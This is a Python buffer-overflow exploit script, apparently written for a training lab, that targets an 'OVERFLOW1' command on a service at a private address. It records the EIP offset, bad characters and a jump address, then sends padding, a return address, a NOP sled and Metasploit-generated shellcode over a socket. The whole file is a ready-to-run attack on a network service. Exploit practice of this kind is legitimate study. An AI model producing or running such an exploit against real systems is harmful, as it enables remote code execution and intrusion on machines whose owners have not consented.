#!/usr/bin/python

import socket, sys
from time import sleep

# Overwrite EIP
# EIP 6F43396E
# [*] Exact match at offset 1978

# badchars 00 07 08 2e 2f a0 a1
# removed 00 07 2e a0

# jmp address (on little endian)
# 0x625011af = af 11 50 62

host = '10.10.82.202'
port = 1337

# MSF Payload
buf =  b""
buf += b"\xda\xd7\xd9\x74\x24\xf4\xbe\xaa\xb0\x25\x42\x5a\x31"
buf += b"\xc9\xb1\x52\x31\x72\x17\x83\xea\xfc\x03\xd8\xa3\xc7"
buf += b"\xb7\xe0\x2c\x85\x38\x18\xad\xea\xb1\xfd\x9c\x2a\xa5"
buf += b"\x76\x8e\x9a\xad\xda\x23\x50\xe3\xce\xb0\x14\x2c\xe1"
buf += b"\x71\x92\x0a\xcc\x82\x8f\x6f\x4f\x01\xd2\xa3\xaf\x38"
buf += b"\x1d\xb6\xae\x7d\x40\x3b\xe2\xd6\x0e\xee\x12\x52\x5a"
buf += b"\x33\x99\x28\x4a\x33\x7e\xf8\x6d\x12\xd1\x72\x34\xb4"
buf += b"\xd0\x57\x4c\xfd\xca\xb4\x69\xb7\x61\x0e\x05\x46\xa3"
buf += b"\x5e\xe6\xe5\x8a\x6e\x15\xf7\xcb\x49\xc6\x82\x25\xaa"
buf += b"\x7b\x95\xf2\xd0\xa7\x10\xe0\x73\x23\x82\xcc\x82\xe0"
buf += b"\x55\x87\x89\x4d\x11\xcf\x8d\x50\xf6\x64\xa9\xd9\xf9"
buf += b"\xaa\x3b\x99\xdd\x6e\x67\x79\x7f\x37\xcd\x2c\x80\x27"
buf += b"\xae\x91\x24\x2c\x43\xc5\x54\x6f\x0c\x2a\x55\x8f\xcc"
buf += b"\x24\xee\xfc\xfe\xeb\x44\x6a\xb3\x64\x43\x6d\xb4\x5e"
buf += b"\x33\xe1\x4b\x61\x44\x28\x88\x35\x14\x42\x39\x36\xff"
buf += b"\x92\xc6\xe3\x50\xc2\x68\x5c\x11\xb2\xc8\x0c\xf9\xd8"
buf += b"\xc6\x73\x19\xe3\x0c\x1c\xb0\x1e\xc7\x29\x4e\x33\x4e"
buf += b"\x46\x52\x33\x71\x2d\xdb\xd5\x1b\x41\x8a\x4e\xb4\xf8"
buf += b"\x97\x04\x25\x04\x02\x61\x65\x8e\xa1\x96\x28\x67\xcf"
buf += b"\x84\xdd\x87\x9a\xf6\x48\x97\x30\x9e\x17\x0a\xdf\x5e"
buf += b"\x51\x37\x48\x09\x36\x89\x81\xdf\xaa\xb0\x3b\xfd\x36"
buf += b"\x24\x03\x45\xed\x95\x8a\x44\x60\xa1\xa8\x56\xbc\x2a"
buf += b"\xf5\x02\x10\x7d\xa3\xfc\xd6\xd7\x05\x56\x81\x84\xcf"
buf += b"\x3e\x54\xe7\xcf\x38\x59\x22\xa6\xa4\xe8\x9b\xff\xdb"
buf += b"\xc5\x4b\x08\xa4\x3b\xec\xf7\x7f\xf8\x0c\x1a\x55\xf5"
buf += b"\xa4\x83\x3c\xb4\xa8\x33\xeb\xfb\xd4\xb7\x19\x84\x22"
buf += b"\xa7\x68\x81\x6f\x6f\x81\xfb\xe0\x1a\xa5\xa8\x01\x0f"

# Return adderss 625011af (little endian)
# \xaf\x11\x50\x62
nop_sled = "\x90" * 16

shellcode = "A" * 1978 + "\xaf\x11\x50\x62" + nop_sled + buf

def inject(host, port, payload):
	
			try:
				s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((host, port))

				s.send(("OVERFLOW1 " + payload))
				s.close()

			except:
				print("error.. unable to connect")
				sys.exit()

if __name__ == '__main__':
	inject(host, port, shellcode)
